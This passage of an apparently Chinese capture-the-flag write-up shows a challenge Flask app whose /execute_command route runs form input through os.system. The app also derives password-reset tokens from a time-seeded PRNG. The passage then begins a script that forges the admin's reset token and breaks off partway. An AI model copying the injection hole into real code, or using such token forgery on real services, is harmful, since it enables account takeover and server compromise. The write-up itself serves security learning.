</span></span><span class="line"><span class="ln">135</span><span class="cl">        <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">        <span class="n">new_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">hashed_password</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">new_user</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">
</span></span><span class="line"><span class="ln">140</span><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;注册成功，请登录&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">
</span></span><span class="line"><span class="ln">143</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">
</span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">
</span></span><span class="line"><span class="ln">151</span><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">check_password_hash</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">username</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;is_admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">is_admin</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;登陆成功，欢迎!&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;用户名或密码错误!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">
</span></span><span class="line"><span class="ln">162</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">
</span></span><span class="line"><span class="ln">164</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;成功登出&#39;</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">
</span></span><span class="line"><span class="ln">171</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/dashboard&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;dashboard.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">
</span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/forgot_password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;email&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">            <span class="c1"># 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">            <span class="c1"># UUID v8吧，看起来版本比较新</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">padding</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">)))</span> <span class="c1"># 可以自定义参数吗原来，那把username放进去吧</span>
</span></span><span class="line"><span class="ln">185</span><span class="cl">            <span class="n">reset_token</span> <span class="o">=</span> <span class="n">PasswordResetToken</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">reset_token</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl">            <span class="c1"># TODO：写一个SMTP服务把token发出去</span>
</span></span><span class="line"><span class="ln">189</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;密码恢复token已经发送，请检查你的邮箱&#39;</span><span class="p">,</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">191</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">192</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;没有找到该邮箱对应的注册账户&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">193</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;forgot_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">194</span><span class="cl">
</span></span><span class="line"><span class="ln">195</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;forgot_password.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">196</span><span class="cl">
</span></span><span class="line"><span class="ln">197</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/reset_password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">198</span><span class="cl"><span class="k">def</span> <span class="nf">reset_password</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">199</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">200</span><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">201</span><span class="cl">        <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;new_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">202</span><span class="cl">        <span class="n">confirm_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;confirm_password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">203</span><span class="cl">
</span></span><span class="line"><span class="ln">204</span><span class="cl">        <span class="k">if</span> <span class="n">new_password</span> <span class="o">!=</span> <span class="n">confirm_password</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">205</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;密码不匹配&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">206</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">207</span><span class="cl">
</span></span><span class="line"><span class="ln">208</span><span class="cl">        <span class="n">reset_token</span> <span class="o">=</span> <span class="n">PasswordResetToken</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">,</span> <span class="n">used</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">209</span><span class="cl">        <span class="k">if</span> <span class="n">reset_token</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">210</span><span class="cl">            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">reset_token</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">211</span><span class="cl">            <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">212</span><span class="cl">            <span class="n">reset_token</span><span class="o">.</span><span class="n">used</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">213</span><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">214</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;成功重置密码！请重新登录&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">215</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">216</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">217</span><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;无效或过期的token&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">218</span><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;reset_password&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">219</span><span class="cl">
</span></span><span class="line"><span class="ln">220</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;reset_password.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">221</span><span class="cl">
</span></span><span class="line"><span class="ln">222</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/execute_command&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">223</span><span class="cl"><span class="nd">@login_required</span>
</span></span><span class="line"><span class="ln">224</span><span class="cl"><span class="k">def</span> <span class="nf">execute_command</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">225</span><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">check_time_api</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">226</span><span class="cl">    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">227</span><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;API死了啦，都你害的啦。&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">228</span><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">229</span><span class="cl">
</span></span><span class="line"><span class="ln">230</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">231</span><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;2066年才完工哈，你可以穿越到2066年看看&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">232</span><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;dashboard&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">233</span><span class="cl">
</span></span><span class="line"><span class="ln">234</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">235</span><span class="cl">        <span class="n">command</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;command&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">236</span><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="c1"># 什么？你说安全？不是，都说了还没完工催什么。</span>
</span></span><span class="line"><span class="ln">237</span><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;execute_command&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">238</span><span class="cl">
</span></span><span class="line"><span class="ln">239</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;execute_command.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">240</span><span class="cl">
</span></span><span class="line"><span class="ln">241</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/settings&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">242</span><span class="cl"><span class="nd">@admin_required</span>
</span></span><span class="line"><span class="ln">243</span><span class="cl"><span class="k">def</span> <span class="nf">admin_settings</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">244</span><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">245</span><span class="cl">    
</span></span><span class="line"><span class="ln">246</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">247</span><span class="cl">        <span class="n">new_api</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;time_api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">248</span><span class="cl">        <span class="n">user</span><span class="o">.</span><span class="n">time_api</span> <span class="o">=</span> <span class="n">new_api</span>
</span></span><span class="line"><span class="ln">249</span><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">250</span><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;成功更新API！&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">251</span><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;admin_settings&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">252</span><span class="cl">
</span></span><span class="line"><span class="ln">253</span><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;admin_settings.html&#39;</span><span class="p">,</span> <span class="n">time_api</span><span class="o">=</span><span class="n">user</span><span class="o">.</span><span class="n">time_api</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">254</span><span class="cl">
</span></span><span class="line"><span class="ln">255</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">256</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>一开始发现我的uuid没有uuid8，感觉是版本问题，刚好在出题人博客看到了uuidv8的实现，就直接拿来用了</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984425-2.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">uuid8</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">b</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Generate a UUID from three custom blocks.
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">    * &#39;a&#39; is the first 48-bit chunk of the UUID (octets 0-5);
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">    * &#39;b&#39; is the mid 12-bit chunk (octets 6-7);
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">    * &#39;c&#39; is the last 62-bit chunk (octets 8-15).
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s2">    When a value is not specified, a pseudo-random value is generated.
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">if</span> <span class="n">a</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">if</span> <span class="n">b</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span> <span class="n">c</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">62</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">&amp;</span> <span class="mh">0xffff_ffff_ffff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">80</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="n">c</span> <span class="o">&amp;</span> <span class="mh">0x3fff_ffff_ffff_ffff</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="c1"># Set version and variant flags</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">76</span><span class="p">)</span>  <span class="c1"># Version 8</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">int_uuid_8</span> <span class="o">|=</span> <span class="p">(</span><span class="mh">0x02</span> <span class="o">&lt;&lt;</span> <span class="mi">62</span><span class="p">)</span>  <span class="c1"># Variant 10xx (RFC4122)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="nb">int</span><span class="o">=</span><span class="n">int_uuid_8</span><span class="p">)</span>
</span></span></code></pre></div><p>在源码中token的生成是在a位置传入username，b，c为空，但是我们可以看到b，c处生成的是伪随机数，种子是固定的，是程序的启动时间，我们可以在/server_info拿到。接下来就是伪造token去改admin密码。</p>
<p>生成token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">SERVER_START_TIME</span> <span class="o">=</span> <span class="mf">1755353838.0696628</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">SERVER_START_TIME</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">byte_string</span> <span class="o">=</span> <span class="n">input_string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="p">:</span> <span class="n">byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">padded_byte_string</span> <span class="o">=</span> <span class="n">byte_string</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">padded_int</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padded_byte_string</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="n">padded_int</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
